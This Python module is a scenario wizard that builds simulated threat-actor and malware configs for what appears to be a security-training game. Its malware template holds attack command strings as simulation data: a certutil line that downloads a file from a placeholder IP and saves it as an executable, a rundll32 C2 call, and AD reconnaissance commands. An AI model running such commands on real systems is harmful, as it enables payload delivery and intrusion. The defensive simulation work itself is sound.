"""
Scenario story wizard (#13) — the capstone authoring flow.

Pick an archetype (espionage, ransomware, insider, supply-chain), a name, a timeline,
and targets, and this scaffolds a **consistent, validated** set of configs: an actor
config wired with a coherent technique chain (and the required fields those techniques
need), plus an optional malware config the actor references. From there the existing
tools take over — the result is saved through the config validator (#1) via
``scenario_admin``, and the admin can one-click auto-generate matching challenges (#11)
and the game guide (#12).

``build_wizard_configs`` is pure (params dict in, config dicts out) so it's unit-testable;
the admin route gathers form input, calls it, then validates + writes via scenario_admin.
"""

import re


# Each archetype is a coherent intrusion story expressed as a technique chain plus a
# little framing. Techniques are registry attack strings (validated on save).
ARCHETYPES = {
    "espionage": {
        "label": "Espionage",
        "description": "A patient, stealthy actor: phish in, escalate, move laterally, "
                       "clear logs, and quietly exfiltrate over time.",
        "motivation": "Espionage",
        "uses_malware": True,
        "attacks": [
            "email:phishing", "identity:kerberoasting", "execution:psexec_lateral",
            "evasion:log_clearing", "cloud:session_hijacking", "exfiltration:email_collection",
        ],
    },
    "ransomware": {
        "label": "Ransomware",
        "description": "A fast, loud crew: malicious attachment, rapid lateral movement, "
                       "persistence, log clearing, and hands-on-keyboard staging.",
        "motivation": "Financial",
        "uses_malware": True,
        "attacks": [
            "email:malware_delivery", "discovery:automated_recon", "execution:psexec_lateral",
            "persistence:scheduled_task", "evasion:log_clearing", "hands_on_keyboard:operator",
        ],
    },
    "insider": {
        "label": "Insider threat",
        "description": "Someone who already has access: reconnaissance, mailbox "
                       "collection, and exfiltration via cloud storage — no phishing needed.",
        "motivation": "Data theft",
        "uses_malware": False,
        "attacks": [
            "discovery:automated_recon", "exfiltration:email_collection",
            "cloud:exfiltration_via_storage",
        ],
    },
    "supply_chain": {
        "label": "Supply-chain",
        "description": "Compromise comes through a trusted path: partner phishing and a "
                       "watering-hole drive-by, then credential theft and lateral movement.",
        "motivation": "Espionage",
        "uses_malware": True,
        "attacks": [
            "delivery:supply_chain", "watering_hole:malware_delivery",
            "identity:kerberoasting", "execution:psexec_lateral",
        ],
    },
}

# Attacks that require watering_hole_domains on the actor (per the registry).
_WATERING_HOLE_ATTACKS = {"watering_hole:malware_delivery", "watering_hole:phishing"}
# Attacks that imply the actor sends email (so sender/subject themes are worth scaffolding).
_EMAIL_ATTACKS = {"email:phishing", "email:malware_delivery", "delivery:supply_chain"}


def archetype_choices():
    """[(key, label, description, default_attacks)] for rendering the wizard."""
    return [(k, v["label"], v["description"], list(v["attacks"])) for k, v in ARCHETYPES.items()]


def _slug(name):
    s = re.sub(r"[^a-z0-9]+", "", (name or "actor").lower())
    return s or "actor"


def _malware_config(slug):
    """A minimal but valid malware config the scaffolded actor can reference."""
    return {
        "name": slug + "mal",
        "filenames": [slug + ".exe", slug + "svc.exe", "update.exe"],
        "paths": ["C:\\ProgramData\\" + slug + "\\", "C:\\Windows\\Temp\\"],
        "recon_processes": [
            {"name": "powershell.exe", "process": "powershell.exe Get-ADUser -Filter *"},
            {"name": "cmd.exe", "process": "cmd.exe arp -a"},
            {"name": "net.exe", "process": "net.exe view"},
        ],
        "c2_processes": [
            {"name": "rundll32.exe", "process": "rundll32.exe {ip_address}:443"},
            {"name": "certutil.exe",
             "process": "certutil.exe -urlcache -split -f http://{ip_address}/a.gif C:\\temp\\u.exe"},
        ],
    }


def build_wizard_configs(params, get_spec=None):
    """
    Build (actor_config, malware_config_or_None, notes) from wizard params.

    params keys:
      archetype (required), name (required),
      activity_start_date, activity_end_date (required),
      activity_start_hour (int, default 9), workday_length_hours (int, default 8),
      attribution, aliases (list), attack_group_id, origin, report_url,
      attacks (list — overrides the archetype default if given),
      watering_hole_target_roles (list), theme (str), include_malware (bool).

    Raises ValueError for an unknown archetype or missing required basics.
    """
    arche_key = (params.get("archetype") or "").strip()
    arche = ARCHETYPES.get(arche_key)
    if not arche:
        raise ValueError("unknown archetype %r (choose one of: %s)"
                         % (arche_key, ", ".join(ARCHETYPES)))

    name = (params.get("name") or "").strip()
    if not name:
        raise ValueError("an actor name is required")

    notes = []
    attacks = list(params.get("attacks") or arche["attacks"])
    slug = _slug(name)
    theme = (params.get("theme") or slug).strip()

    config = {
        "name": name,
        "activity_start_date": params.get("activity_start_date"),
        "activity_end_date": params.get("activity_end_date"),
        "activity_start_hour": int(params.get("activity_start_hour") or 9),
        "workday_length_hours": int(params.get("workday_length_hours") or 8),
        "attacks": attacks,
        "motivation": params.get("motivation") or arche["motivation"],
    }
    # optional attribution metadata (#40/#45)
    for k in ("attribution", "attack_group_id", "origin", "report_url"):
        if params.get(k):
            config[k] = params[k]
    if params.get("aliases"):
        config["aliases"] = list(params["aliases"])

    # Recommended realism content so the actor produces plausible infra/email.
    config["domain_themes"] = [theme, theme + "-update", theme + "-secure"]
    if any(a in _EMAIL_ATTACKS for a in attacks):
        config["sender_themes"] = [theme, "it-" + theme, "hr-" + theme]
        config["subjects"] = ["Action required: account review",
                              "Invoice attached", "Shared document"]

    roles = list(params.get("watering_hole_target_roles") or [])
    # Required field: any watering-hole technique needs watering_hole_domains.
    if any(a in _WATERING_HOLE_ATTACKS for a in attacks):
        config["watering_hole_domains"] = [theme + "-portal.com", theme + "-cdn.net"]
        if not roles:
            roles = ["IT", "Finance"]
            notes.append("Added default watering-hole target roles (IT, Finance) — edit as needed.")
    if roles:
        config["watering_hole_target_roles"] = roles

    # Malware: scaffold a referenced config when the archetype (or the admin) wants it.
    include_mw = params.get("include_malware")
    if include_mw is None:
        include_mw = arche["uses_malware"]
    malware_config = None
    if include_mw:
        malware_config = _malware_config(slug)
        config["malware"] = [malware_config["name"]]
        config["file_names"] = list(malware_config["filenames"])

    # drop empty values for a clean config
    config = {k: v for k, v in config.items() if v not in (None, "", [], {})}
    return config, malware_config, notes
